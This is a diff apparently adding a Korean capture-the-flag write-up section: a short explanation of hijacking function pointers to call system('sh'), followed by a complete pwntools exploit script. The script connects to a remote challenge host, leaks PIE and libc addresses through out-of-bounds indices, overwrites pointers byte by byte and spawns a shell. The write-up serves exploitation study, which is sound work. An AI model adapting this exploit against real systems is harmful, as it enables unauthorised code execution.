@@ -660,4 +660,103 @@ unsigned __int64 edit()
 }
 ```
 
-`edit`에서 `chain 0, destination 0`에 `sh\x00`을 적는다. 함수 포인터 3번에 `copy`, 함수 포인터 4번에 `system` 함수 주소를 입력하고 `view`를 실행한다. 그럼 3번에 있던 `copy`가 실행되는데, 이 때 `chain 0, destination 0`을 입력하면 `rdi`가 위에서 설정한 그 주소로 바뀐다. 어셈블리어로 보면 알 수 있듯 `c`
+`edit`에서 `chain 0, destination 0`에 `sh\x00`을 적는다. 함수 포인터 3번에 `copy`, 함수 포인터 4번에 `system` 함수 주소를 입력하고 `view`를 실행한다. 그럼 3번에 있던 `copy`가 실행되는데, 이 때 `chain 0, destination 0`을 입력하면 `rdi`가 위에서 설정한 그 주소로 바뀐다. 어셈블리어로 보면 알 수 있듯 `copy` 함수에서 `memcpy` 이후, 그리고 `view` 함수에서 함수 포인터 실행 중 `rdi` 값이 바뀌지 않는다. 따라서 4번이 실행되면 `system("sh")`를 실행시킬 수 있다.
+
+### ex.py
+
+```python
+from pwn import *
+import argparse
+import re
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'set follow-fork-mode parent',
+    #'b *$rebase(0x1e7b)',
+    'b *$rebase(0x2020)',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("15.165.233.83", 31407)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+l = ELF('./libc.so.6')
+#l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def edit(idx : int, idx2 : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendlineafter(b': ', str(idx2).encode())
+    p.sendafter(b': ', ctt)
+
+def copy(idx : int, idx1 : int, idx2 : int):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendlineafter(b': ', str(idx1).encode())
+    p.sendlineafter(b': ', str(idx2).encode())
+    p.sendafter(b': ', b'n')
+
+def view():
+    p.sendlineafter(b'> ', b'3')
+    p.recvline()
+    p.recvline()
+    p.recvline()
+    p.recvline()
+    msg = p.recvline()
+    msg = re.sub(r'\x1b\[[0-9;]*m'.encode(), b'', msg)
+    msg = msg.strip().split(b'----')
+    return msg
+
+copy(2, -72, 0)
+copy(0, -51, 0)
+copy(2, -96, 1)
+copy(0, -75, 1)
+msg = view()
+# print(msg)
+piebase = (u64(msg[0][:3].ljust(8, b'\x00')) << 24) + u64(msg[2][:3].ljust(8, b'\x00'))
+piebase -= 0x5008
+l.address = ((u64(msg[0][3:6].ljust(8, b'\x00')) << 24) + u64(msg[2][3:6].ljust(8, b'\x00'))) - l.sym['putchar']
+print(hex(piebase))
+print(hex(l.address))
+
+edit(0, 0, b'\x00' + p8((piebase + 0x1d26) & 0xff) + b'\x00')
+copy(0, 0, -15)
+edit(1, 0, p32(((piebase + 0x1d26) >> 8) & 0xffffff)[:3])
+copy(1, 0, -25)
+edit(2, 0, p32(((piebase + 0x1d26) >> 24) & 0xffffff)[:3])
+copy(2, 0, -35)
+# print(hex(piebase + 0x5100))
+
+#gdb.attach(p, '\n'.join(gdb_cmds))
+edit(1, 0, p32((l.sym['system']) & 0xffffff)[:3])
+copy(1, 0, -24)
+edit(2, 0, p32(((l.sym['system'] >> 16) & 0xffffff))[:3])
+copy(2, 0, -34)
+edit(0, 0, p32(((l.sym['system']) >> 40) & 0xffffff)[:3])
+copy(0, 0, -13)
+edit(0, 0, b'sh\x00')
+view()
+p.sendlineafter(b': ', str(0).encode())
+p.sendlineafter(b': ', str(0).encode())
+p.sendlineafter(b': ', str(0).encode())
+p.sendafter(b': ', b'n')
+p.interactive()
+```
+
+---
+
+# 
